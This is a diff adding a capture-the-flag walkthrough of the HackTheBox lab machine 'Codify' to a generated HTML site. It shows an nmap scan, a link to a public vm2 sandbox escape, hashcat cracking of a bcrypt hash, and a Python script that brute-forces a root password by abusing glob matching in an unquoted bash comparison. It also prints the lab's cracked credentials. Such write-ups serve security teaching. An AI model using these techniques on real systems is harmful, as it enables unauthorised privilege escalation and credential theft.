@@ -2846,12 +2846,45 @@
     Foothold
   </a>
   
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vm3-sandbox-escape" class="md-nav__link">
+    vm3 sandbox escape
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
   <a href="#privilege-escalation" class="md-nav__link">
     Privilege Escalation
   </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#svc-joshua" class="md-nav__link">
+    svc -&gt; joshua
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#joshua-root" class="md-nav__link">
+    joshua -&gt; root
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -3226,12 +3259,45 @@
     Foothold
   </a>
   
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vm3-sandbox-escape" class="md-nav__link">
+    vm3 sandbox escape
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
   <a href="#privilege-escalation" class="md-nav__link">
     Privilege Escalation
   </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#svc-joshua" class="md-nav__link">
+    svc -&gt; joshua
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#joshua-root" class="md-nav__link">
+    joshua -&gt; root
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -3262,9 +3328,121 @@
 <h2 id="machine-info">Machine Info<a class="headerlink" href="#machine-info" title="Permanent link">&para;</a></h2>
 <p><img alt="image-20231203210719041" src="../Codify.assets/image-20231203210719041.png" /></p>
 <h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT     STATE SERVICE VERSION
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>| ssh-hostkey:
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>80/tcp   open  http    Apache httpd 2.4.52
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>|_http-title: Did not follow redirect to http://codify.htb/
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>3000/tcp open  http    Node.js Express framework
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>|_http-title: Codify
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>No exact OS matches for host (test conditions non-ideal).
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Network Distance: 2 hops
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div>
+<ul>
+<li>80, 3000: http nodejs</li>
+</ul>
 <h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">&para;</a></h2>
+<h3 id="vm3-sandbox-escape">vm3 sandbox escape<a class="headerlink" href="#vm3-sandbox-escape" title="Permanent link">&para;</a></h3>
+<ul>
+<li>enum: vm3, sandbox, nodejs(javascript)</li>
+</ul>
+<p><img alt="image-20231204011007713" src="../Codify.assets/image-20231204011007713.png" /></p>
+<p><img alt="image-20231204011011272" src="../Codify.assets/image-20231204011011272.png" /></p>
+<ul>
+<li>vm3, restricted sandbox</li>
+</ul>
+<p><img alt="image-20231204010942460" src="../Codify.assets/image-20231204010942460.png" /></p>
+<ul>
+<li>search sploit online</li>
+</ul>
+<p><img alt="image-20231204011027049" src="../Codify.assets/image-20231204011027049.png" /></p>
+<ul>
+<li>
+<p><strong><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16 (github.com)</a></strong></p>
+</li>
+<li>
+<p>RCE PoC</p>
+</li>
+</ul>
+<p><img alt="image-20231204011128717" src="../Codify.assets/image-20231204011128717.png" /></p>
+<ul>
+<li>get shell</li>
+</ul>
+<p><img alt="image-20231204011144555" src="../Codify.assets/image-20231204011144555.png" /></p>
 <h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p><img alt="image-20231204011157157" src="../Codify.assets/image-20231204011157157.png" /></p>
+<p><img alt="image-20231204011159963" src="../Codify.assets/image-20231204011159963.png" /></p>
+<h3 id="svc-joshua">svc -&gt; joshua<a class="headerlink" href="#svc-joshua" title="Permanent link">&para;</a></h3>
+<ul>
+<li>enum db file</li>
+</ul>
+<p><img alt="image-20231204011221148" src="../Codify.assets/image-20231204011221148.png" /></p>
+<ul>
+<li>check details inside this db file and find cred</li>
+</ul>
+<p><img alt="image-20231204011240044" src="../Codify.assets/image-20231204011240044.png" /></p>
+<p><img alt="image-20231204011243672" src="../Codify.assets/image-20231204011243672.png" /></p>
+<ul>
+<li>crack this hash -&gt; <strong>joshua:spongebob1</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nv">$2</span>a<span class="nv">$12$SOn8Pf6z8fO</span>/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>$<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">3200</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p><img alt="image-20231204011311938" src="../Codify.assets/image-20231204011311938.png" /></p>
+<p><img alt="image-20231204011330985" src="../Codify.assets/image-20231204011330985.png" /></p>
+<h3 id="joshua-root">joshua -&gt; root<a class="headerlink" href="#joshua-root" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>sudo -l</code></li>
+</ul>
+<p><img alt="image-20231204011340576" src="../Codify.assets/image-20231204011340576.png" /></p>
+<ul>
+<li><code>if [[ $DB_PASS == $USER_PASS ]]; then</code> -&gt; <strong>pattern match</strong> (<strong>Ref</strong>: <a href="https://github.com/anordal/shellharden/blob/master/how_to_do_things_safely_in_bash.md">shellharden/how_to_do_things_safely_in_bash.md at master · anordal/shellharden (github.com)</a>)</li>
+</ul>
+<p><img alt="image-20231204011413970" src="../Codify.assets/image-20231204011413970.png" /></p>
+<ul>
+<li>So, input <code>*</code> for matching all strings</li>
+</ul>
+<p><img alt="image-20231204011441203" src="../Codify.assets/image-20231204011441203.png" /></p>
+<ul>
+<li>failed to check dumped db file [x]</li>
+</ul>
+<p><img alt="image-20231204011455369" src="../Codify.assets/image-20231204011455369.png" /></p>
+<ul>
+<li><strong>brute force</strong> <strong>DB_PASS</strong> based on this logical vuln of this script</li>
+</ul>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span> <span class="nn">string</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kn">import</span> <span class="nn">subprocess</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">cred</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="k">while</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">:</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>        <span class="n">test</span> <span class="o">=</span> <span class="n">cred</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="s2">&quot;*&quot;</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>        <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;echo </span><span class="si">{</span><span class="n">test</span><span class="si">}</span><span class="s2"> | sudo /opt/scripts/mysql-backup.sh&quot;</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>        <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>        <span class="k">if</span> <span class="s2">&quot;Password confirmed!&quot;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>            <span class="n">cred</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] find the </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">cred</span><span class="p">)</span><span class="si">}</span><span class="s2"> th char: </span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>            <span class="k">break</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>        <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;DB_PASS: </span><span class="si">{</span><span class="n">cred</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<p><img alt="image-20231204011552208" src="../Codify.assets/image-20231204011552208.png" /></p>
+<ul>
+<li>get cred: <strong>root:kljh12k3jhaskjh12kjh3</strong></li>
+</ul>
+<p><img alt="image-20231204011610480" src="../Codify.assets/image-20231204011610480.png" /></p>
 <h2 id="exploit-chain">Exploit Chain<a class="headerlink" href="#exploit-chain" title="Permanent link">&para;</a></h2>
+<p>vm2 sandbox esacping -&gt; rce -&gt; get svc shell -&gt; sensitive db file leakage -&gt; crack pass hash -&gt; get joshua shell -&gt; misconfig sudo script -&gt; brute force root pass -&gt; root shell</p>
 
 
 
